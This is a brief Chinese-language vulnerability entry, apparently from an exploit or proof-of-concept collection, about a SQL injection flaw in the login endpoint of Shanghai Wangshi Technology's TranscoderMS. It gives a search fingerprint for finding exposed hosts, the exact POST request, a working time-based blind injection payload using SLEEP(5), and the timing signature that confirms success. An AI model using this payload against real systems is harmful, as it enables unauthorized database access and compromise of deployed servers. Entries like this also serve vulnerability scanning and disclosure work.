# 上海网仕科技TranscoderMSindex.php存在SQL注入漏洞

上海网仕科技 ｜ SQL注入 ｜ —
- **指纹**：`body="webtrans//js/md5-min.js"`
- **请求**：`POST /webtrans/index.php?controller=user&action=login HTTP/1.1`

**Payload**
```
name=test123') AND (SELECT 3356 FROM (SELECT(SLEEP(5)))xSEI) AND ('pJPU'='pJPU&pass=OThkNzJlMThlMDUwMGZlNzk5ZTY0Y2MyYTkxNzIyYzY%3D&lang=zh_CN
```
- **响应特征**：200 响应时间>=5s